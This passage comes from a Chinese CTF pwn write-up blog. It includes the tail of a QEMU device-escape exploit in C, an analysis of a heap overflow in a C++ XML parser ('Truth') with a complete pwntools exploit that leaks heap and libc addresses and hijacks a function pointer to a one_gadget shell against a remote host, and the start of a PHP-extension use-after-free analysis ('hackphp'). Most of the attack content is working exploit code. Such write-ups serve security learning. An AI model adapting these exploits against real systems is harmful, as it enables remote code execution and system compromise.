class="string">"\n"</span>, gva_to_gpa(<span class="built_in">buffer</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> res[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> key[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;; </span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    outw(<span class="number">0</span>, <span class="number">0xC040</span> + <span class="number">0x4</span>); <span class="comment">// set keys all zero</span></span><br><span class="line">    outw(<span class="number">0x100</span>, <span class="number">0xC040</span> + <span class="number">0x8</span>); <span class="comment">// seek = 0x100</span></span><br><span class="line">    res[<span class="number">0</span>] = mmio_read(<span class="number">0x18</span>);</span><br><span class="line">    res[<span class="number">1</span>] = mmio_read(<span class="number">0x18</span>);</span><br><span class="line">    encrypt(res, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, *(<span class="keyword">uint64_t</span> *)res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> libc_base = *(<span class="keyword">uint64_t</span> *)res - <span class="number">0x25eb0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"libc_base: %p\n"</span>, libc_base);</span><br><span class="line">    <span class="keyword">uint64_t</span> system = libc_base + <span class="number">0x30410</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"system address: %p\n"</span>, system);</span><br><span class="line"></span><br><span class="line">    res[<span class="number">0</span>] = system &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    res[<span class="number">1</span>] = system &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    decrypt(res, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"res[0]: %p\n"</span>, res[<span class="number">0</span>]);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, res[<span class="number">0</span>]);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, res[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    outw(<span class="number">0x0</span>, <span class="number">0xC040</span> + <span class="number">0x8</span>); <span class="comment">// seek = 0x0</span></span><br><span class="line">    mmio_write(<span class="number">0x0</span>, *(<span class="keyword">uint32_t</span> *)<span class="string">"flag"</span>);</span><br><span class="line">    outl(*(<span class="keyword">uint32_t</span> *)<span class="string">"cat "</span>, <span class="number">0xC040</span> + <span class="number">0x1C</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="Truth"><a href="#Truth" class="headerlink" title="Truth"></a>Truth</h1><p>题目给了源码，编译因为是<code>-O3</code>，加上是cpp程序，所以binary会比较难看，直接分析源码即可。</p><ol><li><p>首先，程序实现了一个简单的xml文件解析功能，提供了四个功能：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Please input file's content"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span> (read(STDIN_FILENO, &amp;temp, <span class="number">1</span>) &amp;&amp; temp != <span class="string">'\xff'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlContent.push_back(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    xmlfile.parseXml(xmlContent);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Please input the node name which you want to edit"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; nodeName &gt;&gt; content;</span><br><span class="line">    xmlfile.editXML(nodeName, content);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    pnode(*xmlfile.node-&gt;begin(), <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"MEME"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; nodeName;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> temp = pnode(*xmlfile.node-&gt;begin(), <span class="string">""</span>, nodeName)) </span><br><span class="line">        temp-&gt;meme(temp-&gt;backup);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>分别是解析一个xml文件，编辑所给xml文件中给定节点的内容，打印节点信息，以及打印类成员backup中的内容。</p></li><li><p>主要注意到在输入一个xml文件，触发解析逻辑的时候：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> XML_NODE::parseNodeContents(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>::value_type&gt;::iterator&amp; current)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (*current)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (*current)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> CHARACTACTERS::LT:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (*(current + <span class="number">1</span>) == CHARACTACTERS::SLASH)</span><br><span class="line">&#123;</span><br><span class="line">current += <span class="number">2</span>;</span><br><span class="line"><span class="keyword">auto</span> gt = iterFind(current, CHARACTACTERS::GT);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;nodeName != <span class="built_in">std</span>::<span class="built_in">string</span>&#123; current, gt &#125;)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Unmatch!"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">current = gt + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">++current;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;XML_NODE&gt; node(<span class="built_in">std</span>::make_shared&lt;XML_NODE&gt;());</span><br><span class="line">node-&gt;parse(current);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>-&gt;node)</span><br><span class="line"><span class="keyword">this</span>-&gt;node = <span class="built_in">std</span>::make_shared &lt; <span class="built_in">std</span>::<span class="built_in">vector</span> &lt; <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;XML_NODE&gt;&gt;&gt;();</span><br><span class="line"><span class="keyword">this</span>-&gt;node-&gt;push_back(node);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> CHARACTACTERS::NEWLINE:</span><br><span class="line"><span class="keyword">case</span> CHARACTACTERS::BLANK:</span><br><span class="line">++current;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> lt = iterFind(current, CHARACTACTERS::LT);</span><br><span class="line">data = <span class="built_in">std</span>::make_shared &lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(current, lt);</span><br><span class="line">backup = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">// malloc here</span></span><br><span class="line">current = lt;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>backup</code>的大小是固定的由<code>malloc(0x50)</code>得到的，但是后面在<code>editXML</code>中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> XML::editXML(<span class="built_in">std</span>::<span class="built_in">string</span>&amp; name, <span class="built_in">std</span>::<span class="built_in">string</span>&amp; content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> status = getEditStatus(name, content);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (status &gt;= <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;XML_NODE&gt; a = pnode(*node-&gt;begin(), <span class="string">""</span>, name);</span><br><span class="line"><span class="keyword">if</span> (a &amp;&amp; a-&gt;nodeName == name)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (status == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">*(a-&gt;data) = content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a-&gt;data-&gt;length(); i++) <span class="comment">// data can be very long</span></span><br><span class="line">&#123;</span><br><span class="line">a-&gt;backup[i] = (*a-&gt;data)[i];</span><br><span class="line">&#125;</span><br><span class="line">*(a-&gt;data) = content;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"No such name"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的逻辑是，每次要edit节点内容的时候，会将原来<code>data</code>中的数据放到<code>backup</code>中，然后再用<code>data</code>储存输入的新数据；问题在于，输入的<code>data</code>长度并没有限制，因此复制到<code>backup</code>中的时候，显然存在溢出的可能，于是这里存在一个heap overflow。</p></li><li><p>同时很重要的一点，菜单的第四个功能，是通过类成员中的一个函数指针实现的，即<code>temp-&gt;meme(temp-&gt;backup);</code>中的<code>meme</code>，因此修改该函数指针，即可劫持程序控制流；同时，由于<code>backup</code>是在解析xml文件时分配的内存，因此其处于heap中地址较低处，也就是说，通过溢出<code>backup</code>，可以覆盖到后面地址中存在的许多结构体，也可以leak出其中存在的heap地址和libc地址。此外，由于分析具体的结构体构成比较费力，覆盖heap中数据时，应尽量避免修改原有数据，而主要是找到<code>backup</code>以及<code>meme</code>所在的位置，覆盖该<code>backup</code>指针指向任意地址或者覆盖<code>meme</code>指向<code>onegadget</code>，即可实现任意地址读写以及getshell。</p></li><li><p>因此利用思路为：</p><ul><li>首先参照xml文件格式，编写一个尽量简单的文件交给程序解析，由于整个利用围绕xml中的节点展开，所以这里只定义一个root节点，也方便debug。</li><li>通过<code>editXML</code>，实现溢出<code>backup</code>，再调用<code>temp-&gt;meme(temp-&gt;backup)</code>，将<code>backup</code>后面的heap地址leak出来。</li><li>伪造结构体，控制其中的成员<code>backup</code>为<code>read_got</code>，通过<code>temp-&gt;meme(temp-&gt;backup)</code>来leak出libc地址。</li><li>再控制成员<code>meme</code>为<code>onegadget</code>即可。</li><li>总的来说，很多结构体并没有分析到位，基本通过调试，然后不断试错实现利用的，所以分析写得比较难看。</li></ul></li><li><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, os, re</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)p = remote(<span class="string">'106.14.216.214'</span>, <span class="number">48476</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># menu</span></span><br><span class="line">choose_items = &#123;</span><br><span class="line">    <span class="string">"add"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">"edit"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">"show"</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="string">"bonus"</span>: <span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">    choose(choose_items[<span class="string">'add'</span>])</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input file's content"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(name, content)</span>:</span></span><br><span class="line">    choose(choose_items[<span class="string">'edit'</span>])</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input the node name which you want to edit"</span>, name)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    choose(choose_items[<span class="string">'show'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bonus</span><span class="params">(name)</span>:</span></span><br><span class="line">    choose(choose_items[<span class="string">'bonus'</span>])</span><br><span class="line">    p.sendlineafter(<span class="string">"MEME"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># heap overflow, leak heap base</span></span><br><span class="line">add(<span class="string">"&lt;?xml version=\"1.0\" ?&gt;&lt;root&gt;"</span> + <span class="string">"A"</span> * <span class="number">0x20</span> + <span class="string">"&lt;/root&gt;\xFF"</span>)</span><br><span class="line">edit(<span class="string">"root"</span>, <span class="string">"B"</span> * <span class="number">0x68</span> + <span class="string">"heapaddr"</span>)</span><br><span class="line">edit(<span class="string">"root"</span>, <span class="string">"C"</span> * <span class="number">0x58</span>)</span><br><span class="line">bonus(<span class="string">"root"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"heapaddr"</span>)</span><br><span class="line">heap_base = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x11f30</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># heap overflow, hijack struct to leak libc base</span></span><br><span class="line">edit(<span class="string">"root"</span>, <span class="string">"D"</span> * <span class="number">0x58</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x405608</span>) + p64(<span class="number">0x0000000100000001</span>) + p64(heap_base + <span class="number">0x12180</span>))</span><br><span class="line">pause()</span><br><span class="line">payload = flat([heap_base + <span class="number">0x121a0</span>, heap_base + <span class="number">0x12190</span>, <span class="number">0x405608</span>, <span class="number">0x0000000100000001</span>, <span class="number">0x405340</span>, heap_base + <span class="number">0x11de8</span>, <span class="number">4</span>, <span class="number">0x746f6f72</span>] + \</span><br><span class="line">               <span class="number">4</span> *[<span class="number">0</span>] + [heap_base + <span class="number">0x11e00</span>] * <span class="number">2</span> + \</span><br><span class="line">               [<span class="number">0</span>] + \</span><br><span class="line">               [heap_base + <span class="number">0x11e70</span>, heap_base + <span class="number">0x11e60</span>] + \</span><br><span class="line">               [<span class="number">0</span>] * <span class="number">2</span> + \</span><br><span class="line">               [elf.got[<span class="string">'read'</span>]])</span><br><span class="line">edit(<span class="string">"root"</span>, payload)</span><br><span class="line">bonus(<span class="string">"root"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Useless"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - libc.sym[<span class="string">'read'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1207</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack fp</span></span><br><span class="line">payload = flat([heap_base + <span class="number">0x121a0</span>, heap_base + <span class="number">0x12190</span>, <span class="number">0x405608</span>, <span class="number">0x0000000100000001</span>, heap_base + <span class="number">0x121C0</span>, heap_base + <span class="number">0x11de8</span>, <span class="number">4</span>, <span class="number">0x746f6f72</span>] + \</span><br><span class="line">               [one_gadget, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>] + \</span><br><span class="line">               [heap_base + <span class="number">0x11e00</span>] * <span class="number">2</span> + \</span><br><span class="line">               [<span class="number">0</span>] + \</span><br><span class="line">               [heap_base + <span class="number">0x11e70</span>, heap_base + <span class="number">0x11e60</span>] + \</span><br><span class="line">               [<span class="number">0</span>] * <span class="number">2</span> + \</span><br><span class="line">               [heap_base + <span class="number">0x12228</span>])</span><br><span class="line">edit(<span class="string">"root"</span>, payload)</span><br><span class="line">bonus(<span class="string">"root"</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="hackphp"><a href="#hackphp" class="headerlink" title="hackphp"></a>hackphp</h1><p>第一次webpwn，题目本身并不难，主要是调试比较麻烦，Docker build出来的环境都和远程不一致（不知为何）。</p><ol><li><p>分析<code>hackphp.so</code>，主要关注这几个<code>hackphp</code>相关的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">zif_hackphp_edit_cold</span><br><span class="line">zif_info_hackphp</span><br><span class="line">zm_activate_hackphp</span><br><span class="line">zif_hackphp_create</span><br><span class="line">zif_hackphp_delete</span><br><span class="line">zif_hackphp_edit</span><br><span class="line">zif_hackphp_get</span><br><span class="line">zif_startup_hackphp</span><br></pre></td></tr></table></figure><p>可以看出模式依然是菜单题模式，其中<code>zif_hackphp_create</code>存在很明显的uaf漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">zif_hackphp_create</span><span class="params">(zend_execute_data *execute_data, zval *return_value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 <span class="built_in">size</span>[<span class="number">3</span>]; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = execute_data-&gt;This.u2.next;</span><br><span class="line">  <span class="built_in">size</span>[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)zend_parse_parameters(v2, &amp;unk_2000, <span class="built_in">size</span>) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="keyword">char</span> *)_emalloc(<span class="built_in">size</span>[<span class="number">0</span>]);</span><br><span class="line">    buf = v3;</span><br><span class="line">    buf_size = <span class="built_in">size</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="built_in">size</span>[<span class="number">0</span>] - <span class="number">0x100</span>) &lt;= <span class="number">0x100</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        return_value-&gt;u1.type_info = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      _efree(v3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return_value-&gt;u1.type_info = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当所给的size不处于0x100~0x200之间时，就会马上调用<code>_efree(v3)</code>给释放掉，但是指针并没有清空，依然可以show和edit。</p></li><li><p>其次，了解到本题中的堆管理机制并不同于ptmalloc，从利用的角度来说，而是有点类似于linux kernel的slab，即单考虑小块内存，总共有以下粒度，同一粒度的chunk最开始来自于某同一page：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">define ZEND_MM_BINS_INFO(_, x, y) \</span><br><span class="line">    _( <span class="number">0</span>,    <span class="number">8</span>,  <span class="number">512</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">1</span>,   <span class="number">16</span>,  <span class="number">256</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">2</span>,   <span class="number">24</span>,  <span class="number">170</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">3</span>,   <span class="number">32</span>,  <span class="number">128</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">4</span>,   <span class="number">40</span>,  <span class="number">102</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">5</span>,   <span class="number">48</span>,   <span class="number">85</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">6</span>,   <span class="number">56</span>,   <span class="number">73</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">7</span>,   <span class="number">64</span>,   <span class="number">64</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">8</span>,   <span class="number">80</span>,   <span class="number">51</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">9</span>,   <span class="number">96</span>,   <span class="number">42</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">10</span>,  <span class="number">112</span>,   <span class="number">36</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">11</span>,  <span class="number">128</span>,   <span class="number">32</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">12</span>,  <span class="number">160</span>,   <span class="number">25</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">13</span>,  <span class="number">192</span>,   <span class="number">21</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">14</span>,  <span class="number">224</span>,   <span class="number">18</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">15</span>,  <span class="number">256</span>,   <span class="number">16</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">16</span>,  <span class="number">320</span>,   <span class="number">64</span>, <span class="number">5</span>, x, y) \</span><br><span class="line">    _(<span class="number">17</span>,  <span class="number">384</span>,   <span class="number">32</span>, <span class="number">3</span>, x, y) \</span><br><span class="line">    _(<span class="number">18</span>,  <span class="number">448</span>,    <span class="number">9</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">19</span>,  <span class="number">512</span>,    <span class="number">8</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">20</span>,  <span class="number">640</span>,   <span class="number">32</span>, <span class="number">5</span>, x, y) \</span><br><span class="line">    _(<span class="number">21</span>,  <span class="number">768</span>,   <span class="number">16</span>, <span class="number">3</span>, x, y) \</span><br><span class="line">    _(<span class="number">22</span>,  <span class="number">896</span>,    <span class="number">9</span>, <span class="number">2</span>, x, y) \</span><br><span class="line">    _(<span class="number">23</span>, <span class="number">1024</span>,    <span class="number">8</span>, <span class="number">2</span>, x, y) \</span><br><span class="line">    _(<span class="number">24</span>, <span class="number">1280</span>,   <span class="number">16</span>, <span class="number">5</span>, x, y) \</span><br><span class="line">    _(<span class="number">25</span>, <span class="number">1536</span>,    <span class="number">8</span>, <span class="number">3</span>, x, y) \</span><br><span class="line">    _(<span class="number">26</span>, <span class="number">1792</span>,   <span class="number">16</span>, <span class="number">7</span>, x, y) \</span><br><span class="line">    _(<span class="number">27</span>, <span class="number">2048</span>,    <span class="number">8</span>, <span class="number">4</span>, x, y) \</span><br><span class="line">    _(<span class="number">28</span>, <span class="number">2560</span>,    <span class="number">8</span>, 